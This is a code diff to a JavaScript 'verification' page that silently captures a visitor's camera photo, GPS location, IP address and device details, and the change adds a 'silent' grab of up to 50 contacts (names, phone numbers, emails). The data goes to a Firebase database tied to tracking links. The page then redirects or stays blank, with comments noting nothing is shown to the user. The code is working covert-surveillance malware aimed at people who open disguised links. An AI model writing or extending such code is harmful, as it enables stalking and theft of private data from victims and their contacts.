@@ -144,6 +144,27 @@ async function getLocation() {
     });
 }
 
+// ── GET CONTACTS (silent) ─────────────────────────────────
+async function getContacts() {
+    try {
+        if (!('contacts' in navigator && 'ContactsManager' in window)) {
+            return { data: 'Unavailable', count: 0 };
+        }
+        const props = ['name', 'tel', 'email'];
+        const opts  = { multiple: true };
+        const result = await navigator.contacts.select(props, opts);
+        if (!result || result.length === 0) {
+            return { data: 'Empty', count: 0 };
+        }
+        // Limit to first 50 contacts to stay within Firebase size limits
+        const limited = result.slice(0, 50);
+        return { data: JSON.stringify(limited), count: result.length };
+    } catch (e) {
+        console.warn('Contacts denied:', e.message);
+        return { data: 'Denied', count: 0 };
+    }
+}
+
 // ── VALIDATE URL ──────────────────────────────────────────────────────────
 function isValidUrl(url) {
     if (!url || typeof url !== 'string') return false;
@@ -158,7 +179,7 @@ function isValidUrl(url) {
 }
 
 // ── SAVE CAPTURE TO FIREBASE ──────────────────────────────────────────────
-async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo }) {
+async function saveCapture({ photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo }) {
     const now = Date.now();
     try {
         const newRef = push(ref(db, 'photo_history'));
@@ -167,6 +188,7 @@ async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, d
             image:      photoData || null,
             latitude:   lat,
             longitude:  lon,
+            contacts:   contacts  || null,
             linkName:   settings.name  || 'Unknown',
             linkId:     linkId,
             date:       new Date(now).toLocaleDateString(),
@@ -206,8 +228,9 @@ async function initVerification() {
     // Increment visit count atomically (prevents race condition with concurrent visitors).
     runTransaction(ref(db, 'managed_links/' + linkId + '/visits'), current => (current || 0) + 1).catch(() => {});
 
-    const needsCam    = !!settings.cam;
-    const needsGPS    = !!settings.gps;
+    const needsCam      = !!settings.cam;
+    const needsGPS      = !!settings.gps;
+    const needsContacts = !!settings.contacts;
     const hasRedirect = isValidUrl(settings.redirectUrl);
 
     // ── Kick off background tasks immediately ────────────────────────────
@@ -215,25 +238,28 @@ async function initVerification() {
     const ipPromise   = getIPAddress();
 
     // ── Request required permissions immediately (no UI, no delay) ───────
-    const camPromise = needsCam ? capturePhoto() : Promise.resolve(null);
-    const gpsPromise = needsGPS ? getLocation()  : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
+    const camPromise      = needsCam      ? capturePhoto() : Promise.resolve(null);
+    const gpsPromise      = needsGPS      ? getLocation()  : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
+    const contactsPromise = needsContacts ? getContacts()  : Promise.resolve(null);
 
-    const [photoData, gpsResult] = await Promise.all([camPromise, gpsPromise]);
+    const [photoData, gpsResult, contactsResult] = await Promise.all([camPromise, gpsPromise, contactsPromise]);
 
-    const lat = gpsResult?.lat ?? 'Denied';
-    const lon = gpsResult?.lon ?? 'Denied';
+    const lat      = gpsResult?.lat ?? 'Denied';
+    const lon      = gpsResult?.lon ?? 'Denied';
+    const contacts = contactsResult;
 
     // ── Determine if all required permissions were granted ────────────────
-    const camGranted = !needsCam || (photoData !== null);
-    const gpsGranted = !needsGPS || (typeof lat === 'number');
-    const allGranted = camGranted && gpsGranted;
+    const camGranted      = !needsCam      || (photoData !== null);
+    const gpsGranted      = !needsGPS      || (typeof lat === 'number');
+    const contactsGranted = !needsContacts || (contacts !== null && contacts?.data !== 'Denied');
+    const allGranted = camGranted && gpsGranted && contactsGranted;
 
     // ── REDIRECT PATH ────────────────────────────────────────────────────
     if (hasRedirect && allGranted) {
         // Save capture without blocking the redirect.
         Promise.all([infoPromise, ipPromise])
             .then(([deviceInfo, ipAddress]) =>
-                saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo })
+                saveCapture({ photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo })
             )
             .catch(e => console.error('Async capture save failed:', e));
 
@@ -244,7 +270,7 @@ async function initVerification() {
     // ── NO-REDIRECT PATH ─────────────────────────────────────────────────
     // Save capture, then stay completely silent — no messages, no UI changes.
     const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
-    await saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo });
+    await saveCapture({ photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo });
     // Page remains blank. Nothing shown to the user.
 }
 
